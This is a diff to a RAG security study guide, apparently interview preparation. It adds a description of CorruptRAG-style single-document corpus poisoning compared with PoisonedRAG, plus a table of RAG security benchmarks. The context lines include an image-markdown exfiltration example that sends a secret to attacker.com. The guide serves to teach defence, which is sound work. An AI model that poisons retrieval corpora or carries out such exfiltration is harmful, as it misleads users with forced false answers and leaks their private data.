@@ -88,6 +88,7 @@ Attack: Attacker plants malicious doc in corpus. When retrieved, it overrides sy
 | **Denial of Service** | Corpus insert | Exhaust token budget | Document: 100K tokens of repeated text | High (detectable by latency/token count) |
 | **Markdown/Image Exfiltration** | Corpus insert (agentic/tool-use context) | Leak data via auto-rendered image request | Retrieved content instructs agent to render `![](https://attacker.com/log?d=<secret>)` | Medium (unusual outbound URLs in output) |
 | **Corpus Poisoning (PoisonedRAG-style)** | Ingestion/indexing pipeline | Force a specific wrong answer for a target query | Attacker inserts ~5 crafted docs into a corpus of millions, optimized for both retrieval rank and target answer | Low (docs look like normal, on-topic content) |
+| **Single-Document Poisoning (CorruptRAG-style)** | Ingestion/indexing pipeline | Force a wrong answer using a minimal injection footprint | Attacker inserts a **single** optimized document per target query instead of PoisonedRAG's multiple documents | Very low (one on-topic document is far less anomalous than a cluster of near-duplicates) |
 
 ### Concrete Examples
 
@@ -177,6 +178,42 @@ outliers, or unusually high similarity to known high-value queries); track
 document provenance so poisoned sources can be traced and purged; prefer
 retrieval-time corroboration (cross-checking claims across independently
 sourced documents) over trusting any single retrieved passage.
+```
+
+**Example 6: Single-Document Corpus Poisoning (CorruptRAG-style)**
+```
+CorruptRAG (Zhang et al., "Practical Poisoning Attacks against
+Retrieval-Augmented Generation," 2025) targets a specific weakness in
+PoisonedRAG's threat model: PoisonedRAG assumes the attacker can inject
+*multiple* poisoned documents per target query — enough of them to
+outnumber the genuine, correct-answer documents among the top-k retrieved
+results. The paper argues this is a costlier, more detectable footprint
+in practice (more anomalous near-duplicate content landing in the corpus
+at once).
+
+Attack:
+1. Attacker picks a target question and a target (false) answer, same as
+   PoisonedRAG.
+2. Instead of crafting several mutually-reinforcing documents, the attacker
+   optimizes a **single** document to simultaneously rank highly for the
+   target question and carry the false answer — using a budget-aware
+   objective that concentrates all the "attack signal" into one passage.
+   A stronger variant (CorruptRAG-AS) further boosts that one document's
+   independent effectiveness so it doesn't rely on companion documents at
+   all.
+3. That one document is inserted into the corpus.
+4. Reported result: this single-document attack achieves a *higher* attack
+   success rate than PoisonedRAG's multi-document approach, while injecting
+   far less content — i.e., cheaper and stealthier, not just as effective.
+
+Why this matters beyond PoisonedRAG: it lowers the bar for corpus
+poisoning. Defenses that look for *clusters* of suspicious near-duplicate
+documents (a natural response to PoisonedRAG) don't catch a single
+well-optimized document. The same mitigations apply (provenance tracking,
+outlier detection, retrieval-time corroboration across independently
+sourced documents), but corroboration matters even more here — a claim
+that only ever traces back to one source is inherently higher-risk
+regardless of how "normal" that source looks.
 ```
 
 ---
@@ -479,6 +516,19 @@ def is_output_injected(output: str, retrieved_docs: list[str]) -> float:
     
     return injection_probability
 ```
+
+---
+
+## Benchmarking RAG Security
+
+Point-in-time defenses are hard to evaluate in isolation — "does this mitigation work?" needs a standardized set of attacks and pipelines to test against. A few benchmarks have emerged specifically for this:
+
+| Benchmark | Scope | What It Tests |
+|---|---|---|
+| **SafeRAG** (Liang et al., ACL 2025) | Broad RAG security | A manually-constructed attack dataset spanning four categories — noise injection, inter-context conflict, "soft ad" injection, and denial-of-service — evaluated across 14 representative RAG components (retrievers, filters, generator LLMs). Finding: even simple attacks routinely bypass retrievers, filters, and advanced LLMs alike; RAG pipelines are broadly under-defended by default. |
+| **Poisoning-attack benchmark** (arXiv:2505.18543, 2025) | Corpus poisoning specifically | 13 poisoning attack methods × 7 defenses, run across 5 standard QA datasets plus 10 harder expanded variants, and across sequential/branching/conditional/loop RAG, multi-turn conversational RAG, multimodal RAG, and agentic RAG. Finding: attack success rates that look strong on standard QA datasets (the kind PoisonedRAG/CorruptRAG were evaluated on) drop sharply on the harder variants — a reminder that headline attack-success numbers don't always generalize across RAG architectures. |
+
+**Why this matters in interviews:** If asked "how would you validate a RAG security mitigation before shipping it?", the strong answer is "run it against a standardized attack suite (e.g., SafeRAG-style categories), not just the one attack we're worried about" — a mitigation tuned against PoisonedRAG-style multi-document poisoning may not catch CorruptRAG-style single-document poisoning, and vice versa.
 
 ---
 
